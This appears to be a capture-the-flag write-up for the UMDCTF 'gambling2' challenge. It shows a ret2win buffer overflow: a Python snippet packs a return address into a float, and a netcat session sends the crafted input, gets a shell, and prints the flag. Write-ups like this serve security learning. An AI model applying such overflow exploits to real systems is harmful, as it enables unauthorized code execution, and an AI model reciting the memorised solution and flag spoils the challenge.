# Solution
Determine the position of `print_money()` function via gdb, try to make a buffer overflow & ret2win aligning with the position of `print_money()` to be able to execute shell in remote server and fetch the flag

```
import struct
# JUNK first, then address
packed = b'JUNK' + struct.pack('<I', 0x080492c0)
print(struct.unpack('<d', packed)[0])
```

Entering sequence of zeros and the value obtained from above script causes segfault and aligns positions into the `print_money()` function where we can use shell to obtain the flag.

```
┌──(kali㉿kali)-[~/Downloads/umdctf25/gambling2]
└─$ python run.py
4.867844891338545e-270

┌──(kali㉿kali)-[~/Downloads/umdctf25/gambling2]
└─$ nc challs.umdctf.io 31005
Enter your lucky numbers: 0 0 0 0 0 0 4.867844891338545e-270
Aww dang it!
ls
flag.txt
run
cat flag.txt
UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}
```

Flag: `UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}`



Solved by: jerit3787
